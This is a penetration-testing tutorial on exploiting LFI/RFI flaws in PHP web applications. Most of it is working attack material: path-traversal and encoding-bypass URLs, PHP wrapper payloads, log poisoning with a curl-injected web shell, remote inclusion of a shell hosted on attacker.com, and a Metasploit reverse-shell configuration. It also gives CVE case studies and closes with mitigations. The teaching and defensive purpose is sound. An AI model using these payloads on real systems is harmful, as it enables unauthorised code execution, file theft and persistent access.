# Complete Methodology for Exploiting LFI/RFI Vulnerabilities

## Understanding LFI and RFI: The Basics

File Inclusion vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation. Think of it like a receptionist who lets anyone through the door just because they know a password parameter exists, regardless of whether they have proper authorization .

**Local File Inclusion (LFI)** allows an attacker to read files already present on the target server, such as password files, configuration files, or even source code. **Remote File Inclusion (RFI)** takes this further by allowing the attacker to execute code hosted on their own server, effectively giving them control over the target machine .

The statistics from real-world attacks are staggering: RFI and LFI attacks made up 21% of all application attacks observed across 40 applications between June and November 2011 . These numbers have only grown since then, with major incidents like the compromise of 1.2 million WordPress websites through a TimThumb vulnerability .

## The Core Difference Between LFI and RFI

| Feature | Local File Inclusion (LFI) | Remote File Inclusion (RFI) |
|---------|---------------------------|----------------------------|
| What gets included | Local files already on the server | Remote files from attacker's server |
| Example | `/etc/passwd`, `config.php` | `http://evil.com/malicious.php` |
| Impact | Read sensitive files, possible code execution | Full remote code execution |
| Requirement | None (LFI is often enabled by default) | `allow_url_include = On` in PHP configuration |

## Complete Testing Methodology

### Phase 1: Identifying Vulnerable Parameters

The first step is identifying which parameters might be vulnerable to file inclusion. Common parameter names include:

```
?page=
?file=
?document=
?folder=
?root=
?path=
?location=
?include=
?inc=
?view=
?content=
?lang=
?style=
?template=
?theme=
```

**Real-World Example:** In OWASP Mutillidae II, the `page` parameter in `index.php?page=login.php` is vulnerable. This is a classic training example that mirrors real-world applications .

### Phase 2: Manual Testing with Burp Suite

Burp Suite is the industry standard for web application testing. Here's how to use it effectively:

**Step-by-Step LFI Testing with Burp Suite:**

1. **Configure Burp Proxy:** Set your browser to use Burp as a proxy (127.0.0.1:8080)
2. **Intercept Traffic:** Turn on "Intercept" in the Proxy tab
3. **Capture the Request:** Navigate to the target page and capture the request containing the parameter you want to test
4. **Send to Repeater:** Right-click the request and select "Send to Repeater" for manual testing 

**Basic LFI Test:**
```
Original: http://target.com/index.php?page=home
Modified: http://target.com/index.php?page=../../../../etc/passwd
```

If successful, you'll see the contents of the `/etc/passwd` file displayed in the response .

**Using Burp Intruder for Automated Testing:**

1. **Send to Intruder:** Right-click the request and select "Send to Intruder"
2. **Clear Markers:** Click "Clear §" to remove all position markers
3. **Add Payload Position:** Highlight the parameter value (e.g., `login.php`) and click "Add §"
4. **Load Payload List:** Navigate to Intruder > Payloads and load a traversal wordlist like `Traversal.txt` from the wfuzz collection
5. **Disable URL Encoding:** Scroll down and uncheck "URL-encode these characters" - this is critical because the `../` sequence needs to remain intact 
6. **Start Attack:** Click "Start Attack" and analyze results

**Pro Tip:** Sort the results by the "Length" column. Successful LFI attacks often have significantly different response lengths compared to failed attempts .

### Phase 3: Bypassing Common Defenses

#### Defense #1: Appending Extensions

Many developers add extensions to included files, like:
```php
<?php include($_GET['file'] . ".php"); ?>
```

**Bypass Technique 1 - Null Byte Injection (PHP < 5.3.4):**
```
http://target.com/index.php?page=../../../../etc/passwd%00
```
The null byte (`%00`) tells PHP to ignore everything after it, including the appended `.php` extension .

**Bypass Technique 2 - Path Truncation (Older PHP Versions):**
PHP has a maximum filename length of 4096 bytes. You can create a path longer than this limit so the `.php` extension gets truncated:
```
http://target.com/index.php?page=../../../../etc/passwd/./././././././[repeated 4096 times]
```

#### Defense #2: Filtering ../ Patterns

Some applications strip or block `../` sequences.

**Bypass Technique - Double Encoding:**
```
# Original: ../
# URL encode once: %2e%2e%2f
# URL encode twice: %252e%252e%252f

http://target.com/index.php?page=%252e%252e%252f%252e%252e%252fetc/passwd
```

**Bypass Technique - Nested Bypass (if filter removes ../ once):**
```
# If filter removes "../", this becomes "../../../etc/passwd"
http://target.com/index.php?page=....//....//....//etc/passwd
```

### Phase 4: Advanced LFI Exploitation Techniques

#### PHP Filter Wrapper - Reading Source Code

When you need to read PHP source code (which would normally execute rather than display), use the `php://filter` wrapper:

```
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

This returns the file contents in base64 encoding, which you can decode to view the source code .

**Real-World Application:** This technique is invaluable for reading database credentials from configuration files. One real penetration test found AWS keys in a `config.php` file using this exact method.

#### Log Poisoning - Turning LFI into RCE

Log poisoning is a classic technique where you inject PHP code into server logs, then include those logs to execute your code.

**Step 1: Poison the Apache Access Log**
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com/
```

**Step 2: Include the Poisoned Log**
```
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id
```

**Common Log Locations:**
- Apache: `/var/log/apache2/access.log`, `/var/log/httpd/access_log`
- Nginx: `/var/log/nginx/access.log`
- SSH: `/var/log/auth.log`
- Mail: `/var/log/mail.log`

**Real-World Example - CVE-2020-16152 (Aerohive NetConfig):** This vulnerability affected Aerohive NetConfig versions 10.0r8a and older, allowing unauthenticated attackers to achieve root-level remote code execution by combining LFI with log poisoning of `/tmp/messages`. A Metasploit module exists for this exploit.

#### PHP Input Wrapper - POST Data Execution

When `allow_url_include` is enabled, you can send PHP code directly in POST requests:

```bash
curl -X POST "http://target.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```

#### PHP Expect Wrapper - Direct Command Execution

If the `expect` module is loaded (rare by default):
```
http://target.com/index.php?page=expect://id
```

#### Zip Wrapper - Upload-Based RCE

This technique involves uploading a malicious ZIP file (disguised as an image) and using the `zip://` wrapper to execute it:

1. **Create malicious PHP file:**
   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. **Compress to ZIP:**
   ```bash
   zip payload.zip payload.php
   ```

3. **Rename as image:**
   ```bash
   mv payload.zip payload.jpg
   ```

4. **Upload the image** through any file upload functionality

5. **Execute via LFI:**
   ```
   http://target.com/index.php?page=zip://path/to/uploaded/payload.jpg%23payload.php&cmd=id
   ```
   (Note: `%23` is the URL encoding for `#`) 

### Phase 5: Testing for Remote File Inclusion (RFI)

RFI testing follows a similar methodology but with external URLs instead of local paths.

**Basic RFI Test:**
```
http://target.com/index.php?page=http://attacker.com/shell.txt
```

**Real-World Testing with Burp Suite:**

1. **Intercept the request** containing the parameter
2. **Modify the parameter** to point to an external URL you control
3. **Observe the response** - if the remote content is included, the application is vulnerable to RFI 

**The Shell File (shell.txt):**
```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Once included, you can execute commands:
```
http://target.com/index.php?page=http://attacker.com/shell.txt&cmd=id
```

### Phase 6: Automating with Tools

#### Shellfire - Dedicated LFI/RFI Exploitation Shell

Shellfire is specifically designed for exploiting file inclusion and command injection vulnerabilities .

**Installation:**
```bash
sudo apt install shellfire
```

**Basic Usage:**
```bash
# Set the target URL with injection point
shellfire
.url http://example.com/?path={}
/etc/passwd
```

**Advanced Configuration:**
```bash
# Add cookies for authenticated testing
.cookies { "session_id" : "123456789", "vuln_param": "{}" }
```

#### Python-Based Automated Tester

A comprehensive Python tool exists that tests for LFI, RFI, XSS, and other vulnerabilities :

```bash
# Clone the repository
git clone https://github.com/dotdesh71/Automated-Website-Vulnerability-Testing-Tool.git

# Install dependencies
pip install requests tqdm termcolor tabulate

# Run the tool
python vulnerability_tester.py
# Enter target URL when prompted
```

#### Metasploit for RFI Exploitation

Metasploit includes modules specifically for RFI exploitation :

```bash
msfconsole
use exploit/unix/webapp/php_include
set TARGETURI /vulnerable.php?file=
set RHOSTS target.com
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST your-ip
set LPORT 4444
exploit
```

#### Wfuzz for Fuzzing

Wfuzz can brute-force potential file inclusion paths :

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc=404 "http://target.com/vulnerable.php?file=FUZZ"
```

## Real-World Case Studies

### Case Study 1: CVE-2025-11371 - Gladinet CentreStack (2025)

In October 2025, researchers identified active exploitation of an unauthenticated LFI vulnerability in Gladinet CentreStack and Triofox file-sharing platforms. Over 6,000 internet-exposed instances were vulnerable.

**Attack Flow:**
1. Attacker identifies a vulnerable `UploadDownloadProxy` endpoint
2. Sends specially crafted requests without authentication
3. Reads `web.config` files containing cryptographic keys
4. Uses extracted keys to forge malicious ViewState
5. Achieves Remote Code Execution

**The Lesson:** What started as an LFI (reading configuration files) escalated to full system compromise.

### Case Study 2: LulzSec RFI Campaign (2011)

The infamous LulzSec hacking group heavily utilized RFI vulnerabilities. Analysis of their chat logs revealed they maintained a botnet of approximately 8,000 infected servers used for DDoS attacks - each infected server equivalent to roughly 3,000 bot-infected PCs .

**Direct Quote from LulzSec Chat:**
> "lol - storm would you also like the RFI/LFI bot with google bypass i was talking about while i have this plugged in?"

The group used RFI to take down high-profile targets including the CIA public website.

### Case Study 3: CVE-2023-49103 - ownCloud GraphAPI

This vulnerability affects ownCloud GraphAPI versions before 0.2.1 and 0.3.1. Added to CISA KEV in November 2023, it continues to see active exploitation with 484 unique IPs attempting exploitation in early 2025.

### Case Study 4: CVE-2022-47945 - ThinkPHP

ThinkPHP versions before 6.0.14 are vulnerable to LFI via the `lang` parameter. GreyNoise observed 572 unique IPs attempting to exploit this vulnerability in early 2025:

```http
GET /index.php?lang=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.com
```

## LFI vs RFI: When to Use Which

| Scenario | Use LFI | Use RFI |
|----------|---------|---------|
| Want to read configuration files | ✓ | |
| Need to execute code but can't upload files | ✓ (via log poisoning) | |
| Can upload files anywhere on target | ✓ (via zip wrapper) | |
| `allow_url_include` is enabled | | ✓ |
| Target allows external URL includes | | ✓ |
| You have a web server to host payloads | | ✓ |

## Complete Attack Checklist

### LFI Testing Checklist:
- [ ] Identify file inclusion parameters (page, file, include, etc.)
- [ ] Test basic path traversal: `../../../../etc/passwd`
- [ ] Test encoded bypasses: `%2e%2e%2f`, double encoding
- [ ] Test null byte injection (PHP < 5.3.4): `%00`
- [ ] Test PHP filters: `php://filter/convert.base64-encode/resource=`
- [ ] Check for log poisoning opportunities
- [ ] Attempt to upgrade to RCE via wrappers
- [ ] Document all accessible sensitive files

### RFI Testing Checklist:
- [ ] Confirm `allow_url_include` is enabled
- [ ] Set up a web server to host test payloads
- [ ] Test with simple remote URL inclusion
- [ ] Test with encoded remote URLs
- [ ] Deploy reverse shell payload
- [ ] Establish persistent access

## Mitigation and Prevention

Understanding exploitation helps with defense. Here are the key mitigations:

1. **Disable dangerous PHP settings:**
   ```ini
   allow_url_include = Off
   allow_url_fopen = Off
   ```

2. **Use whitelisting for included files:**
   ```php
   $allowed_pages = ['home', 'about', 'contact'];
   if (in_array($_GET['page'], $allowed_pages)) {
       include($_GET['page'] . '.php');
   }
   ```

3. **Sanitize user input:**
   ```php
   $file = basename(realpath($_GET['page']));
   ```

4. **Use a Web Application Firewall (WAF)** like ModSecurity

5. **Regular patching** - Monitor CISA KEV and apply security updates promptly

6. **Remove unnecessary handlers** - Like the vulnerable UploadDownloadProxy handler in CentreStack

## Summary

LFI and RFI vulnerabilities are extremely dangerous because they can lead to complete system compromise. The methodology is straightforward: identify parameters that accept filenames, test for inclusion vulnerabilities, then escalate to code execution. Tools like Burp Suite make this process efficient, while automated tools like Shellfire and Metasploit can accelerate exploitation.

The key difference between LFI and RFI is whether you're reading local files (LFI) or including remote code (RFI). RFI is generally more severe because it directly enables remote code execution, but LFI can often be escalated to RCE through techniques like log poisoning and wrapper abuse.

Remember that these techniques should only be used on systems you own or have explicit permission to test. The real-world examples demonstrate how attackers use these methods, but they also highlight why proper security controls are essential.
